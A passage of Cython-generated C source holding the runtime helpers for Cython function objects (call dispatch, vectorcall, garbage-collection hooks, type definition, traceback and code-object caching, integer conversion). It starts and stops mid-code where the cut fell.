    {"__reduce__", (PyCFunction)__Pyx_CyFunction_reduce, METH_VARARGS, 0},
    {0, 0, 0, 0}
};
#if PY_VERSION_HEX < 0x030500A0
#define __Pyx_CyFunction_weakreflist(cyfunc) ((cyfunc)->func_weakreflist)
#else
#define __Pyx_CyFunction_weakreflist(cyfunc) (((PyCFunctionObject*)cyfunc)->m_weakreflist)
#endif
static PyObject *__Pyx_CyFunction_Init(__pyx_CyFunctionObject *op, PyMethodDef *ml, int flags, PyObject* qualname,
                                       PyObject *closure, PyObject *module, PyObject* globals, PyObject* code) {
    PyCFunctionObject *cf = (PyCFunctionObject*) op;
    if (unlikely(op == NULL))
        return NULL;
    op->flags = flags;
    __Pyx_CyFunction_weakreflist(op) = NULL;
    cf->m_ml = ml;
    cf->m_self = (PyObject *) op;
    Py_XINCREF(closure);
    op->func_closure = closure;
    Py_XINCREF(module);
    cf->m_module = module;
    op->func_dict = NULL;
    op->func_name = NULL;
    Py_INCREF(qualname);
    op->func_qualname = qualname;
    op->func_doc = NULL;
#if PY_VERSION_HEX < 0x030900B1
    op->func_classobj = NULL;
#else
    ((PyCMethodObject*)op)->mm_class = NULL;
#endif
    op->func_globals = globals;
    Py_INCREF(op->func_globals);
    Py_XINCREF(code);
    op->func_code = code;
    op->defaults_pyobjects = 0;
    op->defaults_size = 0;
    op->defaults = NULL;
    op->defaults_tuple = NULL;
    op->defaults_kwdict = NULL;
    op->defaults_getter = NULL;
    op->func_annotations = NULL;
    op->func_is_coroutine = NULL;
#if CYTHON_METH_FASTCALL
    switch (ml->ml_flags & (METH_VARARGS | METH_FASTCALL | METH_NOARGS | METH_O | METH_KEYWORDS | METH_METHOD)) {
    case METH_NOARGS:
        __Pyx_CyFunction_func_vectorcall(op) = __Pyx_CyFunction_Vectorcall_NOARGS;
        break;
    case METH_O:
        __Pyx_CyFunction_func_vectorcall(op) = __Pyx_CyFunction_Vectorcall_O;
        break;
    case METH_METHOD | METH_FASTCALL | METH_KEYWORDS:
        __Pyx_CyFunction_func_vectorcall(op) = __Pyx_CyFunction_Vectorcall_FASTCALL_KEYWORDS_METHOD;
        break;
    case METH_FASTCALL | METH_KEYWORDS:
        __Pyx_CyFunction_func_vectorcall(op) = __Pyx_CyFunction_Vectorcall_FASTCALL_KEYWORDS;
        break;
    case METH_VARARGS | METH_KEYWORDS:
        __Pyx_CyFunction_func_vectorcall(op) = NULL;
        break;
    default:
        PyErr_SetString(PyExc_SystemError, "Bad call flags for CyFunction");
        Py_DECREF(op);
        return NULL;
    }
#endif
    return (PyObject *) op;
}
static int
__Pyx_CyFunction_clear(__pyx_CyFunctionObject *m)
{
    Py_CLEAR(m->func_closure);
    Py_CLEAR(((PyCFunctionObject*)m)->m_module);
    Py_CLEAR(m->func_dict);
    Py_CLEAR(m->func_name);
    Py_CLEAR(m->func_qualname);
    Py_CLEAR(m->func_doc);
    Py_CLEAR(m->func_globals);
    Py_CLEAR(m->func_code);
#if PY_VERSION_HEX < 0x030900B1
    Py_CLEAR(__Pyx_CyFunction_GetClassObj(m));
#else
    {
        PyObject *cls = (PyObject*) ((PyCMethodObject *) (m))->mm_class;
        ((PyCMethodObject *) (m))->mm_class = NULL;
        Py_XDECREF(cls);
    }
#endif
    Py_CLEAR(m->defaults_tuple);
    Py_CLEAR(m->defaults_kwdict);
    Py_CLEAR(m->func_annotations);
    Py_CLEAR(m->func_is_coroutine);
    if (m->defaults) {
        PyObject **pydefaults = __Pyx_CyFunction_Defaults(PyObject *, m);
        int i;
        for (i = 0; i < m->defaults_pyobjects; i++)
            Py_XDECREF(pydefaults[i]);
        PyObject_Free(m->defaults);
        m->defaults = NULL;
    }
    return 0;
}
static void __Pyx__CyFunction_dealloc(__pyx_CyFunctionObject *m)
{
    if (__Pyx_CyFunction_weakreflist(m) != NULL)
        PyObject_ClearWeakRefs((PyObject *) m);
    __Pyx_CyFunction_clear(m);
    __Pyx_PyHeapTypeObject_GC_Del(m);
}
static void __Pyx_CyFunction_dealloc(__pyx_CyFunctionObject *m)
{
    PyObject_GC_UnTrack(m);
    __Pyx__CyFunction_dealloc(m);
}
static int __Pyx_CyFunction_traverse(__pyx_CyFunctionObject *m, visitproc visit, void *arg)
{
    Py_VISIT(m->func_closure);
    Py_VISIT(((PyCFunctionObject*)m)->m_module);
    Py_VISIT(m->func_dict);
    Py_VISIT(m->func_name);
    Py_VISIT(m->func_qualname);
    Py_VISIT(m->func_doc);
    Py_VISIT(m->func_globals);
    Py_VISIT(m->func_code);
    Py_VISIT(__Pyx_CyFunction_GetClassObj(m));
    Py_VISIT(m->defaults_tuple);
    Py_VISIT(m->defaults_kwdict);
    Py_VISIT(m->func_is_coroutine);
    if (m->defaults) {
        PyObject **pydefaults = __Pyx_CyFunction_Defaults(PyObject *, m);
        int i;
        for (i = 0; i < m->defaults_pyobjects; i++)
            Py_VISIT(pydefaults[i]);
    }
    return 0;
}
static PyObject*
__Pyx_CyFunction_repr(__pyx_CyFunctionObject *op)
{
#if PY_MAJOR_VERSION >= 3
    return PyUnicode_FromFormat("<cyfunction %U at %p>",
                                op->func_qualname, (void *)op);
#else
    return PyString_FromFormat("<cyfunction %s at %p>",
                               PyString_AsString(op->func_qualname), (void *)op);
#endif
}
static PyObject * __Pyx_CyFunction_CallMethod(PyObject *func, PyObject *self, PyObject *arg, PyObject *kw) {
    PyCFunctionObject* f = (PyCFunctionObject*)func;
    PyCFunction meth = f->m_ml->ml_meth;
    Py_ssize_t size;
    switch (f->m_ml->ml_flags & (METH_VARARGS | METH_KEYWORDS | METH_NOARGS | METH_O)) {
    case METH_VARARGS:
        if (likely(kw == NULL || PyDict_Size(kw) == 0))
            return (*meth)(self, arg);
        break;
    case METH_VARARGS | METH_KEYWORDS:
        return (*(PyCFunctionWithKeywords)(void*)meth)(self, arg, kw);
    case METH_NOARGS:
        if (likely(kw == NULL || PyDict_Size(kw) == 0)) {
            size = PyTuple_GET_SIZE(arg);
            if (likely(size == 0))
                return (*meth)(self, NULL);
            PyErr_Format(PyExc_TypeError,
                "%.200s() takes no arguments (%" CYTHON_FORMAT_SSIZE_T "d given)",
                f->m_ml->ml_name, size);
            return NULL;
        }
        break;
    case METH_O:
        if (likely(kw == NULL || PyDict_Size(kw) == 0)) {
            size = PyTuple_GET_SIZE(arg);
            if (likely(size == 1)) {
                PyObject *result, *arg0;
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                arg0 = PyTuple_GET_ITEM(arg, 0);
                #else
                arg0 = PySequence_ITEM(arg, 0); if (unlikely(!arg0)) return NULL;
                #endif
                result = (*meth)(self, arg0);
                #if !(CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS)
                Py_DECREF(arg0);
                #endif
                return result;
            }
            PyErr_Format(PyExc_TypeError,
                "%.200s() takes exactly one argument (%" CYTHON_FORMAT_SSIZE_T "d given)",
                f->m_ml->ml_name, size);
            return NULL;
        }
        break;
    default:
        PyErr_SetString(PyExc_SystemError, "Bad call flags for CyFunction");
        return NULL;
    }
    PyErr_Format(PyExc_TypeError, "%.200s() takes no keyword arguments",
                 f->m_ml->ml_name);
    return NULL;
}
static CYTHON_INLINE PyObject *__Pyx_CyFunction_Call(PyObject *func, PyObject *arg, PyObject *kw) {
    return __Pyx_CyFunction_CallMethod(func, ((PyCFunctionObject*)func)->m_self, arg, kw);
}
static PyObject *__Pyx_CyFunction_CallAsMethod(PyObject *func, PyObject *args, PyObject *kw) {
    PyObject *result;
    __pyx_CyFunctionObject *cyfunc = (__pyx_CyFunctionObject *) func;
#if CYTHON_METH_FASTCALL
     __pyx_vectorcallfunc vc = __Pyx_CyFunction_func_vectorcall(cyfunc);
    if (vc) {
#if CYTHON_ASSUME_SAFE_MACROS
        return __Pyx_PyVectorcall_FastCallDict(func, vc, &PyTuple_GET_ITEM(args, 0), (size_t)PyTuple_GET_SIZE(args), kw);
#else
        (void) &__Pyx_PyVectorcall_FastCallDict;
        return PyVectorcall_Call(func, args, kw);
#endif
    }
#endif
    if ((cyfunc->flags & __Pyx_CYFUNCTION_CCLASS) && !(cyfunc->flags & __Pyx_CYFUNCTION_STATICMETHOD)) {
        Py_ssize_t argc;
        PyObject *new_args;
        PyObject *self;
        argc = PyTuple_GET_SIZE(args);
        new_args = PyTuple_GetSlice(args, 1, argc);
        if (unlikely(!new_args))
            return NULL;
        self = PyTuple_GetItem(args, 0);
        if (unlikely(!self)) {
            Py_DECREF(new_args);
#if PY_MAJOR_VERSION > 2
            PyErr_Format(PyExc_TypeError,
                         "unbound method %.200S() needs an argument",
                         cyfunc->func_qualname);
#else
            PyErr_SetString(PyExc_TypeError,
                            "unbound method needs an argument");
#endif
            return NULL;
        }
        result = __Pyx_CyFunction_CallMethod(func, self, new_args, kw);
        Py_DECREF(new_args);
    } else {
        result = __Pyx_CyFunction_Call(func, args, kw);
    }
    return result;
}
#if CYTHON_METH_FASTCALL
static CYTHON_INLINE int __Pyx_CyFunction_Vectorcall_CheckArgs(__pyx_CyFunctionObject *cyfunc, Py_ssize_t nargs, PyObject *kwnames)
{
    int ret = 0;
    if ((cyfunc->flags & __Pyx_CYFUNCTION_CCLASS) && !(cyfunc->flags & __Pyx_CYFUNCTION_STATICMETHOD)) {
        if (unlikely(nargs < 1)) {
            PyErr_Format(PyExc_TypeError, "%.200s() needs an argument",
                         ((PyCFunctionObject*)cyfunc)->m_ml->ml_name);
            return -1;
        }
        ret = 1;
    }
    if (unlikely(kwnames) && unlikely(PyTuple_GET_SIZE(kwnames))) {
        PyErr_Format(PyExc_TypeError,
                     "%.200s() takes no keyword arguments", ((PyCFunctionObject*)cyfunc)->m_ml->ml_name);
        return -1;
    }
    return ret;
}
static PyObject * __Pyx_CyFunction_Vectorcall_NOARGS(PyObject *func, PyObject *const *args, size_t nargsf, PyObject *kwnames)
{
    __pyx_CyFunctionObject *cyfunc = (__pyx_CyFunctionObject *)func;
    PyMethodDef* def = ((PyCFunctionObject*)cyfunc)->m_ml;
#if CYTHON_BACKPORT_VECTORCALL
    Py_ssize_t nargs = (Py_ssize_t)nargsf;
#else
    Py_ssize_t nargs = PyVectorcall_NARGS(nargsf);
#endif
    PyObject *self;
    switch (__Pyx_CyFunction_Vectorcall_CheckArgs(cyfunc, nargs, kwnames)) {
    case 1:
        self = args[0];
        args += 1;
        nargs -= 1;
        break;
    case 0:
        self = ((PyCFunctionObject*)cyfunc)->m_self;
        break;
    default:
        return NULL;
    }
    if (unlikely(nargs != 0)) {
        PyErr_Format(PyExc_TypeError,
            "%.200s() takes no arguments (%" CYTHON_FORMAT_SSIZE_T "d given)",
            def->ml_name, nargs);
        return NULL;
    }
    return def->ml_meth(self, NULL);
}
static PyObject * __Pyx_CyFunction_Vectorcall_O(PyObject *func, PyObject *const *args, size_t nargsf, PyObject *kwnames)
{
    __pyx_CyFunctionObject *cyfunc = (__pyx_CyFunctionObject *)func;
    PyMethodDef* def = ((PyCFunctionObject*)cyfunc)->m_ml;
#if CYTHON_BACKPORT_VECTORCALL
    Py_ssize_t nargs = (Py_ssize_t)nargsf;
#else
    Py_ssize_t nargs = PyVectorcall_NARGS(nargsf);
#endif
    PyObject *self;
    switch (__Pyx_CyFunction_Vectorcall_CheckArgs(cyfunc, nargs, kwnames)) {
    case 1:
        self = args[0];
        args += 1;
        nargs -= 1;
        break;
    case 0:
        self = ((PyCFunctionObject*)cyfunc)->m_self;
        break;
    default:
        return NULL;
    }
    if (unlikely(nargs != 1)) {
        PyErr_Format(PyExc_TypeError,
            "%.200s() takes exactly one argument (%" CYTHON_FORMAT_SSIZE_T "d given)",
            def->ml_name, nargs);
        return NULL;
    }
    return def->ml_meth(self, args[0]);
}
static PyObject * __Pyx_CyFunction_Vectorcall_FASTCALL_KEYWORDS(PyObject *func, PyObject *const *args, size_t nargsf, PyObject *kwnames)
{
    __pyx_CyFunctionObject *cyfunc = (__pyx_CyFunctionObject *)func;
    PyMethodDef* def = ((PyCFunctionObject*)cyfunc)->m_ml;
#if CYTHON_BACKPORT_VECTORCALL
    Py_ssize_t nargs = (Py_ssize_t)nargsf;
#else
    Py_ssize_t nargs = PyVectorcall_NARGS(nargsf);
#endif
    PyObject *self;
    switch (__Pyx_CyFunction_Vectorcall_CheckArgs(cyfunc, nargs, NULL)) {
    case 1:
        self = args[0];
        args += 1;
        nargs -= 1;
        break;
    case 0:
        self = ((PyCFunctionObject*)cyfunc)->m_self;
        break;
    default:
        return NULL;
    }
    return ((_PyCFunctionFastWithKeywords)(void(*)(void))def->ml_meth)(self, args, nargs, kwnames);
}
static PyObject * __Pyx_CyFunction_Vectorcall_FASTCALL_KEYWORDS_METHOD(PyObject *func, PyObject *const *args, size_t nargsf, PyObject *kwnames)
{
    __pyx_CyFunctionObject *cyfunc = (__pyx_CyFunctionObject *)func;
    PyMethodDef* def = ((PyCFunctionObject*)cyfunc)->m_ml;
    PyTypeObject *cls = (PyTypeObject *) __Pyx_CyFunction_GetClassObj(cyfunc);
#if CYTHON_BACKPORT_VECTORCALL
    Py_ssize_t nargs = (Py_ssize_t)nargsf;
#else
    Py_ssize_t nargs = PyVectorcall_NARGS(nargsf);
#endif
    PyObject *self;
    switch (__Pyx_CyFunction_Vectorcall_CheckArgs(cyfunc, nargs, NULL)) {
    case 1:
        self = args[0];
        args += 1;
        nargs -= 1;
        break;
    case 0:
        self = ((PyCFunctionObject*)cyfunc)->m_self;
        break;
    default:
        return NULL;
    }
    return ((__Pyx_PyCMethod)(void(*)(void))def->ml_meth)(self, cls, args, (size_t)nargs, kwnames);
}
#endif
#if CYTHON_USE_TYPE_SPECS
static PyType_Slot __pyx_CyFunctionType_slots[] = {
    {Py_tp_dealloc, (void *)__Pyx_CyFunction_dealloc},
    {Py_tp_repr, (void *)__Pyx_CyFunction_repr},
    {Py_tp_call, (void *)__Pyx_CyFunction_CallAsMethod},
    {Py_tp_traverse, (void *)__Pyx_CyFunction_traverse},
    {Py_tp_clear, (void *)__Pyx_CyFunction_clear},
    {Py_tp_methods, (void *)__pyx_CyFunction_methods},
    {Py_tp_members, (void *)__pyx_CyFunction_members},
    {Py_tp_getset, (void *)__pyx_CyFunction_getsets},
    {Py_tp_descr_get, (void *)__Pyx_PyMethod_New},
    {0, 0},
};
static PyType_Spec __pyx_CyFunctionType_spec = {
    __PYX_TYPE_MODULE_PREFIX "cython_function_or_method",
    sizeof(__pyx_CyFunctionObject),
    0,
#ifdef Py_TPFLAGS_METHOD_DESCRIPTOR
    Py_TPFLAGS_METHOD_DESCRIPTOR |
#endif
#if (defined(_Py_TPFLAGS_HAVE_VECTORCALL) && CYTHON_METH_FASTCALL)
    _Py_TPFLAGS_HAVE_VECTORCALL |
#endif
    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_HAVE_GC | Py_TPFLAGS_BASETYPE,
    __pyx_CyFunctionType_slots
};
#else
static PyTypeObject __pyx_CyFunctionType_type = {
    PyVarObject_HEAD_INIT(0, 0)
    __PYX_TYPE_MODULE_PREFIX "cython_function_or_method",
    sizeof(__pyx_CyFunctionObject),
    0,
    (destructor) __Pyx_CyFunction_dealloc,
#if !CYTHON_METH_FASTCALL
    0,
#elif CYTHON_BACKPORT_VECTORCALL
    (printfunc)offsetof(__pyx_CyFunctionObject, func_vectorcall),
#else
    offsetof(PyCFunctionObject, vectorcall),
#endif
    0,
    0,
#if PY_MAJOR_VERSION < 3
    0,
#else
    0,
#endif
    (reprfunc) __Pyx_CyFunction_repr,
    0,
    0,
    0,
    0,
    __Pyx_CyFunction_CallAsMethod,
    0,
    0,
    0,
    0,
#ifdef Py_TPFLAGS_METHOD_DESCRIPTOR
    Py_TPFLAGS_METHOD_DESCRIPTOR |
#endif
#ifdef _Py_TPFLAGS_HAVE_VECTORCALL
    _Py_TPFLAGS_HAVE_VECTORCALL |
#endif
    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_HAVE_GC | Py_TPFLAGS_BASETYPE,
    0,
    (traverseproc) __Pyx_CyFunction_traverse,
    (inquiry) __Pyx_CyFunction_clear,
    0,
#if PY_VERSION_HEX < 0x030500A0
    offsetof(__pyx_CyFunctionObject, func_weakreflist),
#else
    offsetof(PyCFunctionObject, m_weakreflist),
#endif
    0,
    0,
    __pyx_CyFunction_methods,
    __pyx_CyFunction_members,
    __pyx_CyFunction_getsets,
    0,
    0,
    __Pyx_PyMethod_New,
    0,
    offsetof(__pyx_CyFunctionObject, func_dict),
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
#if PY_VERSION_HEX >= 0x030400a1
    0,
#endif
#if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
    0,
#endif
#if __PYX_NEED_TP_PRINT_SLOT
    0,
#endif
#if PY_VERSION_HEX >= 0x030C0000
    0,
#endif
#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000 && PY_VERSION_HEX < 0x030a0000
    0,
#endif
};
#endif
static int __pyx_CyFunction_init(PyObject *module) {
#if CYTHON_USE_TYPE_SPECS
    __pyx_CyFunctionType = __Pyx_FetchCommonTypeFromSpec(module, &__pyx_CyFunctionType_spec, NULL);
#else
    CYTHON_UNUSED_VAR(module);
    __pyx_CyFunctionType = __Pyx_FetchCommonType(&__pyx_CyFunctionType_type);
#endif
    if (unlikely(__pyx_CyFunctionType == NULL)) {
        return -1;
    }
    return 0;
}
static CYTHON_INLINE void *__Pyx_CyFunction_InitDefaults(PyObject *func, size_t size, int pyobjects) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults = PyObject_Malloc(size);
    if (unlikely(!m->defaults))
        return PyErr_NoMemory();
    memset(m->defaults, 0, size);
    m->defaults_pyobjects = pyobjects;
    m->defaults_size = size;
    return m->defaults;
}
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsTuple(PyObject *func, PyObject *tuple) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults_tuple = tuple;
    Py_INCREF(tuple);
}
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsKwDict(PyObject *func, PyObject *dict) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults_kwdict = dict;
    Py_INCREF(dict);
}
static CYTHON_INLINE void __Pyx_CyFunction_SetAnnotationsDict(PyObject *func, PyObject *dict) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->func_annotations = dict;
    Py_INCREF(dict);
}

/* CythonFunction */
static PyObject *__Pyx_CyFunction_New(PyMethodDef *ml, int flags, PyObject* qualname,
                                      PyObject *closure, PyObject *module, PyObject* globals, PyObject* code) {
    PyObject *op = __Pyx_CyFunction_Init(
        PyObject_GC_New(__pyx_CyFunctionObject, __pyx_CyFunctionType),
        ml, flags, qualname, closure, module, globals, code
    );
    if (likely(op)) {
        PyObject_GC_Track(op);
    }
    return op;
}

/* PyObjectSetAttrStr */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE int __Pyx_PyObject_SetAttrStr(PyObject* obj, PyObject* attr_name, PyObject* value) {
    PyTypeObject* tp = Py_TYPE(obj);
    if (likely(tp->tp_setattro))
        return tp->tp_setattro(obj, attr_name, value);
#if PY_MAJOR_VERSION < 3
    if (likely(tp->tp_setattr))
        return tp->tp_setattr(obj, PyString_AS_STRING(attr_name), value);
#endif
    return PyObject_SetAttr(obj, attr_name, value);
}
#endif

/* CLineInTraceback */
#ifndef CYTHON_CLINE_IN_TRACEBACK
static int __Pyx_CLineForTraceback(PyThreadState *tstate, int c_line) {
    PyObject *use_cline;
    PyObject *ptype, *pvalue, *ptraceback;
#if CYTHON_COMPILING_IN_CPYTHON
    PyObject **cython_runtime_dict;
#endif
    CYTHON_MAYBE_UNUSED_VAR(tstate);
    if (unlikely(!__pyx_cython_runtime)) {
        return c_line;
    }
    __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
#if CYTHON_COMPILING_IN_CPYTHON
    cython_runtime_dict = _PyObject_GetDictPtr(__pyx_cython_runtime);
    if (likely(cython_runtime_dict)) {
        __PYX_PY_DICT_LOOKUP_IF_MODIFIED(
            use_cline, *cython_runtime_dict,
            __Pyx_PyDict_GetItemStr(*cython_runtime_dict, __pyx_n_s_cline_in_traceback))
    } else
#endif
    {
      PyObject *use_cline_obj = __Pyx_PyObject_GetAttrStrNoError(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback);
      if (use_cline_obj) {
        use_cline = PyObject_Not(use_cline_obj) ? Py_False : Py_True;
        Py_DECREF(use_cline_obj);
      } else {
        PyErr_Clear();
        use_cline = NULL;
      }
    }
    if (!use_cline) {
        c_line = 0;
        (void) PyObject_SetAttr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback, Py_False);
    }
    else if (use_cline == Py_False || (use_cline != Py_True && PyObject_Not(use_cline) != 0)) {
        c_line = 0;
    }
    __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
    return c_line;
}
#endif

/* CodeObjectCache */
#if !CYTHON_COMPILING_IN_LIMITED_API
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line) {
    int start = 0, mid = 0, end = count - 1;
    if (end >= 0 && code_line > entries[end].code_line) {
        return count;
    }
    while (start < end) {
        mid = start + (end - start) / 2;
        if (code_line < entries[mid].code_line) {
            end = mid;
        } else if (code_line > entries[mid].code_line) {
             start = mid + 1;
        } else {
            return mid;
        }
    }
    if (code_line <= entries[mid].code_line) {
        return mid;
    } else {
        return mid + 1;
    }
}
static PyCodeObject *__pyx_find_code_object(int code_line) {
    PyCodeObject* code_object;
    int pos;
    if (unlikely(!code_line) || unlikely(!__pyx_code_cache.entries)) {
        return NULL;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if (unlikely(pos >= __pyx_code_cache.count) || unlikely(__pyx_code_cache.entries[pos].code_line != code_line)) {
        return NULL;
    }
    code_object = __pyx_code_cache.entries[pos].code_object;
    Py_INCREF(code_object);
    return code_object;
}
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object) {
    int pos, i;
    __Pyx_CodeObjectCacheEntry* entries = __pyx_code_cache.entries;
    if (unlikely(!code_line)) {
        return;
    }
    if (unlikely(!entries)) {
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Malloc(64*sizeof(__Pyx_CodeObjectCacheEntry));
        if (likely(entries)) {
            __pyx_code_cache.entries = entries;
            __pyx_code_cache.max_count = 64;
            __pyx_code_cache.count = 1;
            entries[0].code_line = code_line;
            entries[0].code_object = code_object;
            Py_INCREF(code_object);
        }
        return;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if ((pos < __pyx_code_cache.count) && unlikely(__pyx_code_cache.entries[pos].code_line == code_line)) {
        PyCodeObject* tmp = entries[pos].code_object;
        entries[pos].code_object = code_object;
        Py_DECREF(tmp);
        return;
    }
    if (__pyx_code_cache.count == __pyx_code_cache.max_count) {
        int new_max = __pyx_code_cache.max_count + 64;
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Realloc(
            __pyx_code_cache.entries, ((size_t)new_max) * sizeof(__Pyx_CodeObjectCacheEntry));
        if (unlikely(!entries)) {
            return;
        }
        __pyx_code_cache.entries = entries;
        __pyx_code_cache.max_count = new_max;
    }
    for (i=__pyx_code_cache.count; i>pos; i--) {
        entries[i] = entries[i-1];
    }
    entries[pos].code_line = code_line;
    entries[pos].code_object = code_object;
    __pyx_code_cache.count++;
    Py_INCREF(code_object);
}
#endif

/* AddTraceback */
#include "compile.h"
#include "frameobject.h"
#include "traceback.h"
#if PY_VERSION_HEX >= 0x030b00a6
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
#if CYTHON_COMPILING_IN_LIMITED_API
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename) {
    if (c_line) {
        (void) __pyx_cfilenm;
        (void) __Pyx_CLineForTraceback(__Pyx_PyThreadState_Current, c_line);
    }
    _PyTraceback_Add(funcname, filename, py_line);
}
#else
static PyCodeObject* __Pyx_CreateCodeObjectForTraceback(
            const char *funcname, int c_line,
            int py_line, const char *filename) {
    PyCodeObject *py_code = NULL;
    PyObject *py_funcname = NULL;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_srcfile = NULL;
    py_srcfile = PyString_FromString(filename);
    if (!py_srcfile) goto bad;
    #endif
    if (c_line) {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        #else
        py_funcname = PyUnicode_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        funcname = PyUnicode_AsUTF8(py_funcname);
        if (!funcname) goto bad;
        #endif
    }
    else {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromString(funcname);
        if (!py_funcname) goto bad;
        #endif
    }
    #if PY_MAJOR_VERSION < 3
    py_code = __Pyx_PyCode_New(
        0,
        0,
        0,
        0,
        0,
        0,
        __pyx_empty_bytes, /*PyObject *code,*/
        __pyx_empty_tuple, /*PyObject *consts,*/
        __pyx_empty_tuple, /*PyObject *names,*/
        __pyx_empty_tuple, /*PyObject *varnames,*/
        __pyx_empty_tuple, /*PyObject *freevars,*/
        __pyx_empty_tuple, /*PyObject *cellvars,*/
        py_srcfile,   /*PyObject *filename,*/
        py_funcname,  /*PyObject *name,*/
        py_line,
        __pyx_empty_bytes  /*PyObject *lnotab*/
    );
    Py_DECREF(py_srcfile);
    #else
    py_code = PyCode_NewEmpty(filename, funcname, py_line);
    #endif
    Py_XDECREF(py_funcname);  // XDECREF since it's only set on Py3 if cline
    return py_code;
bad:
    Py_XDECREF(py_funcname);
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_srcfile);
    #endif
    return NULL;
}
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename) {
    PyCodeObject *py_code = 0;
    PyFrameObject *py_frame = 0;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject *ptype, *pvalue, *ptraceback;
    if (c_line) {
        c_line = __Pyx_CLineForTraceback(tstate, c_line);
    }
    py_code = __pyx_find_code_object(c_line ? -c_line : py_line);
    if (!py_code) {
        __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
        py_code = __Pyx_CreateCodeObjectForTraceback(
            funcname, c_line, py_line, filename);
        if (!py_code) {
            /* If the code object creation fails, then we should clear the
               fetched exception references and propagate the new exception */
            Py_XDECREF(ptype);
            Py_XDECREF(pvalue);
            Py_XDECREF(ptraceback);
            goto bad;
        }
        __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
        __pyx_insert_code_object(c_line ? -c_line : py_line, py_code);
    }
    py_frame = PyFrame_New(
        tstate,            /*PyThreadState *tstate,*/
        py_code,           /*PyCodeObject *code,*/
        __pyx_d,    /*PyObject *globals,*/
        0                  /*PyObject *locals*/
    );
    if (!py_frame) goto bad;
    __Pyx_PyFrame_SetLineNumber(py_frame, py_line);
    PyTraceBack_Here(py_frame);
bad:
    Py_XDECREF(py_code);
    Py_XDECREF(py_frame);
}
#endif

/* CIntFromPyVerify */
#define __PYX_VERIFY_RETURN_INT(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 0)
#define __PYX_VERIFY_RETURN_INT_EXC(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 1)
#define __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, exc)\
    {\
        func_type value = func_value;\
        if (sizeof(target_type) < sizeof(func_type)) {\
            if (unlikely(value != (func_type) (target_type) value)) {\
                func_type zero = 0;\
                if (exc && unlikely(value == (func_type)-1 && PyErr_Occurred()))\
                    return (target_type) -1;\
                if (is_unsigned && unlikely(value < zero))\
                    goto raise_neg_overflow;\
                else\
                    goto raise_overflow;\
            }\
        }\
        return (target_type) value;\
    }

/* CIntFromPy */
static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if ((sizeof(long) < sizeof(long))) {
            __PYX_VERIFY_RETURN_INT(long, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (long) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            if (unlikely(__Pyx_PyLong_IsNeg(x))) {
                goto raise_neg_overflow;
            } else if (__Pyx_PyLong_IsCompact(x)) {
                __PYX_VERIFY_RETURN_INT(long, __Pyx_compact_upylong, __Pyx_PyLong_CompactValueUnsigned(x))
            } else {
                const digit* digits = __Pyx_PyLong_Digits(x);
                assert(__Pyx_PyLong_DigitCount(x) > 1);
                switch (__Pyx_PyLong_DigitCount(x)) {
                    case 2:
                        if ((8 * sizeof(long) > 1 * PyLong_SHIFT)) {
                            if ((8 * sizeof(unsigned long) > 2 * PyLong_SHIFT)) {
